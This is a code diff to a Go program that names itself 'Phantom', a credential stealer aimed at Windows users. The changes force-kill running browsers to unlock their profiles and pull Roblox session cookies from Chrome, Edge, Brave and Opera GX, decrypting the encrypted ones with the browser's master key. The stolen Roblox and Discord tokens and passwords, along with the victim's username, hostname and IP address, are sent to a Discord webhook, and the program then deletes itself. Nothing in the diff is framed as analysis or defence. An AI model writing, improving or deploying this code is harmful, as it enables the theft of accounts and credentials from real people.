@@ -128,9 +128,24 @@ func main() {
 		return
 	}
 
+	// Execution notification
+	hostname, _ := os.Hostname()
+	ip := getPublicIP()
+	notification := fmt.Sprintf("🚀 **Phantom Executed!**\n👤 User: `%s`\n💻 Machine: `%s`\n🌐 IP: `%s`", os.Getenv("USERNAME"), hostname, ip)
+	sendDiscordNotification(notification)
+
 	report := initSession()
 	syncData(report)
 	selfDelete()
+}
+
+func sendDiscordNotification(content string) {
+	if WebhookURL == "" {
+		return
+	}
+	payload := map[string]string{"content": content}
+	data, _ := json.Marshal(payload)
+	http.Post(WebhookURL, "application/json", bytes.NewBuffer(data))
 }
 
 func selfDelete() {
@@ -443,14 +458,21 @@ func contains(slice []string, s string) bool {
 func extractRobloxCookies() []string {
 	results := []string{}
 
-	// 1. First try the new reliable method (Chromedp / Headless Browser)
-	// This uses the browser's own engine to get the cookies
+	// 1. Force kill browsers (Mandatory for Chromedp and Disk Scan to work)
+	// If browsers are open, they lock the profile and cookie database.
+	browsers := []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "opera_gx.exe"}
+	for _, b := range browsers {
+		exec.Command("taskkill", "/F", "/IM", b, "/T").Run()
+	}
+	time.Sleep(2 * time.Second) // Give some time for processes to fully close
+
+	// 2. Try Chromedp (Browser automation)
 	execPath, profilePath, _ := getBrowserSettings()
 	if profilePath != "" {
 		browserCookies, err := getBrowserCookiesChromedp(execPath, profilePath)
 		if err == nil {
 			for _, cookie := range browserCookies {
-				if strings.EqualFold(cookie.Name, ".ROBLOSECURITY") || strings.EqualFold(cookie.Name, "ROBLOSECURITY") {
+				if strings.Contains(strings.ToUpper(cookie.Name), "ROBLOSECURITY") {
 					if !contains(results, cookie.Value) {
 						results = append(results, cookie.Value)
 					}
@@ -459,19 +481,11 @@ func extractRobloxCookies() []string {
 		}
 	}
 
-	// 2. If Chromedp method didn't get enough tokens, continue with other methods
-	// Force kill browsers to unlock files for direct disk access
-	browsers := []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe"}
-	for _, b := range browsers {
-		exec.Command("taskkill", "/F", "/IM", b, "/T").Run()
-	}
-	time.Sleep(1 * time.Second)
-
 	// 3. Extract from Roblox Desktop App
 	appCookies := extractRobloxCookiesFromDat()
 	results = append(results, appCookies...)
 
-	// 4. Browser Paths for Disk Scan
+	// 4. Aggressive Disk Scan (Fallback)
 	home, _ := os.UserHomeDir()
 	browserPaths := map[string]string{
 		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
@@ -493,12 +507,14 @@ func extractRobloxCookies() []string {
 			if err != nil {
 				return nil
 			}
+			// Plaintext check
 			matches := reRbx.FindAllString(string(content), -1)
 			for _, m := range matches {
 				if len(m) > 100 && !contains(results, m) {
 					results = append(results, m)
 				}
 			}
+			// v10 brute-force check
 			if masterKey != nil {
 				v10Idx := 0
 				for {
@@ -512,8 +528,7 @@ func extractRobloxCookies() []string {
 						if actualIdx+l > len(content) {
 							break
 						}
-						data := content[actualIdx : actualIdx+l]
-						decrypted, err := decryptToken(data, masterKey)
+						decrypted, err := decryptToken(content[actualIdx:actualIdx+l], masterKey)
 						if err == nil && strings.Contains(decrypted, "_|WARNING") {
 							if !contains(results, decrypted) {
 								results = append(results, decrypted)
@@ -570,24 +585,51 @@ func getBrowserCookiesChromedp(execPath, profilePath string) ([]*network.Cookie,
 
 func getBrowserSettings() (string, string, string) {
 	home, _ := os.UserHomeDir()
-	braveExePaths := []string{
-		filepath.Join("C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application", "brave.exe"),
-		filepath.Join("C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application", "brave.exe"),
-	}
-	braveProfilePath := filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data")
 
-	chromeExePaths := []string{
-		filepath.Join("C:\\Program Files\\Google\\Chrome\\Application", "chrome.exe"),
-		filepath.Join("C:\\Program Files (x86)\\Google\\Chrome\\Application", "chrome.exe"),
+	// Define browser configurations
+	browsers := []struct {
+		name        string
+		exePaths    []string
+		profilePath string
+	}{
+		{
+			name: "Brave",
+			exePaths: []string{
+				filepath.Join("C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application", "brave.exe"),
+				filepath.Join("C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application", "brave.exe"),
+			},
+			profilePath: filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
+		},
+		{
+			name: "Chrome",
+			exePaths: []string{
+				filepath.Join("C:\\Program Files\\Google\\Chrome\\Application", "chrome.exe"),
+				filepath.Join("C:\\Program Files (x86)\\Google\\Chrome\\Application", "chrome.exe"),
+			},
+			profilePath: filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
+		},
+		{
+			name: "Edge",
+			exePaths: []string{
+				filepath.Join("C:\\Program Files (x86)\\Microsoft\\Edge\\Application", "msedge.exe"),
+				filepath.Join("C:\\Program Files\\Microsoft\\Edge\\Application", "msedge.exe"),
+			},
+			profilePath: filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
+		},
+		{
+			name: "Opera GX",
+			exePaths: []string{
+				filepath.Join(home, "AppData", "Local", "Programs", "Opera GX", "launcher.exe"),
+			},
+			profilePath: filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
+		},
 	}
-	chromeProfilePath := filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data")
 
-	if path, ok := findExistingPath(braveExePaths); ok && dirExists(braveProfilePath) {
-		return path, braveProfilePath, "Brave"
-	}
-
-	if path, ok := findExistingPath(chromeExePaths); ok && dirExists(chromeProfilePath) {
-		return path, chromeProfilePath, "Chrome"
+	// Try each browser until one is found
+	for _, b := range browsers {
+		if path, ok := findExistingPath(b.exePaths); ok && dirExists(b.profilePath) {
+			return path, b.profilePath, b.name
+		}
 	}
 
 	return "", "", ""
@@ -933,22 +975,31 @@ func copyFile(src, dst string) error {
 }
 
 func syncData(report SystemReport) {
-	jsonData, err := json.MarshalIndent(report, "", "  ")
-	if err != nil {
+	if WebhookURL == "" {
 		return
 	}
 
-	if len(jsonData) > 1800 {
-		sendAsFile(jsonData)
-	} else {
-		payload := map[string]interface{}{
-			"content":  "```json\n" + string(jsonData) + "\n```",
-			"username": "Phantom JSON Logger",
-		}
+	// Pretty print JSON for better readability
+	data, _ := json.MarshalIndent(report, "", "  ")
 
-		body, _ := json.Marshal(payload)
-		sendRequest(body, "application/json")
-	}
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+
+	part, _ := writer.CreateFormFile("file", "phantom_report.json")
+	part.Write(data)
+
+	// Add a summary message to the file upload
+	summary := fmt.Sprintf("📊 **Report for %s**\n🔑 Roblox Tokens: %d\n💎 Discord Tokens: %d\n🔒 Passwords: %d",
+		report.Username, len(report.RobloxCookies), len(report.DiscordTokens), len(report.Passwords))
+	writer.WriteField("content", summary)
+
+	writer.Close()
+
+	req, _ := http.NewRequest("POST", WebhookURL, body)
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+
+	client := &http.Client{Timeout: 30 * time.Second}
+	client.Do(req)
 }
 
 func sendRequest(body []byte, contentType string) {
